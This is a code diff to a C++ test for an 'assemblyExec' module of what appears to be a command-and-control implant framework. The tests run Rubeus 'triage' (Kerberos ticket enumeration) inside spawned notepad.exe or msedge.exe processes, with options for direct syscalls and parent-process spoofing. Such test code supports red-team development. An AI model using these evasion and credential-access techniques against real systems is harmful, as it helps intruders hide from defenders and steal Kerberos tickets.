@@ -28,7 +28,6 @@ bool testAssemblyExec()
 
     {
 #ifdef __linux__
-
 #elif _WIN32
         std::vector<std::string> splitedCmd;
         splitedCmd.push_back("assemblyExec");
@@ -39,18 +38,84 @@ bool testAssemblyExec()
         C2Message c2Message;
         C2Message c2RetMessage;
         assemblyExec->init(splitedCmd, c2Message);
+
+        assemblyExec->setProcessToSpawn("notepad.exe");
+        assemblyExec->setUseSyscall(true);
+        assemblyExec->setModeProcess(true);
+        assemblyExec->setModeSpoofParent(true);
+        assemblyExec->setSpoofedParent("explorer.exe");
+
         assemblyExec->process(c2Message, c2RetMessage);
 
         std::string output = "\n\noutput:\n";
         output += c2RetMessage.returnvalue();
         output += "\n";
         std::cout << output << std::endl;
-#endif
 
+        if(output.size()<20)
+            return false;
+#endif
     }
     {
 #ifdef __linux__
+#elif _WIN32
+        std::vector<std::string> splitedCmd;
+        splitedCmd.push_back("assemblyExec");
+        splitedCmd.push_back("-e");
+        splitedCmd.push_back(".\\Rubeus.exe");
+        splitedCmd.push_back("triage");
 
+        C2Message c2Message;
+        C2Message c2RetMessage;
+        assemblyExec->init(splitedCmd, c2Message);
+
+        assemblyExec->setProcessToSpawn("notepad.exe");
+        assemblyExec->setUseSyscall(true);
+        assemblyExec->setModeProcess(true);
+        assemblyExec->setModeSpoofParent(false);
+        assemblyExec->setSpoofedParent("");
+
+        assemblyExec->process(c2Message, c2RetMessage);
+
+        std::string output = "\n\noutput:\n";
+        output += c2RetMessage.returnvalue();
+        output += "\n";
+        std::cout << output << std::endl;
+
+        if(output.size()<20)
+            return false;
+#endif
+    }
+    {
+#ifdef __linux__
+#elif _WIN32
+        std::vector<std::string> splitedCmd;
+        splitedCmd.push_back("assemblyExec");
+        splitedCmd.push_back("-e");
+        splitedCmd.push_back(".\\Rubeus.exe");
+        splitedCmd.push_back("triage");
+
+        C2Message c2Message;
+        C2Message c2RetMessage;
+        assemblyExec->init(splitedCmd, c2Message);
+
+        assemblyExec->setProcessToSpawn("notepad.exe");
+        assemblyExec->setUseSyscall(false);
+        assemblyExec->setModeProcess(false);
+
+        assemblyExec->process(c2Message, c2RetMessage);
+
+        std::string output = "\n\noutput:\n";
+        output += c2RetMessage.returnvalue();
+        output += "\n";
+        std::cout << output << std::endl;
+
+        if(output.size()<20)
+            return false;
+#endif
+    }
+    {
+#ifdef __linux__
 #elif _WIN32
         std::vector<std::string> splitedCmd;
         splitedCmd.push_back("assemblyExec");
@@ -59,6 +124,11 @@ bool testAssemblyExec()
         splitedCmd.push_back("\"sleep 10000\""); 
         splitedCmd.push_back("\"exit\"");
 
+        assemblyExec->setProcessToSpawn("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
+        assemblyExec->setUseSyscall(false);
+        assemblyExec->setModeProcess(true);
+        assemblyExec->setModeSpoofParent(true);
+        assemblyExec->setSpoofedParent("msedge.exe");
 
         C2Message c2Message;
         C2Message c2RetMessage;
@@ -69,8 +139,10 @@ bool testAssemblyExec()
         output += c2RetMessage.returnvalue();
         output += "\n";
         std::cout << output << std::endl;
-#endif
 
+        if(output.size()<20)
+            return false;
+#endif
     }
 //     {
 // #ifdef __linux__
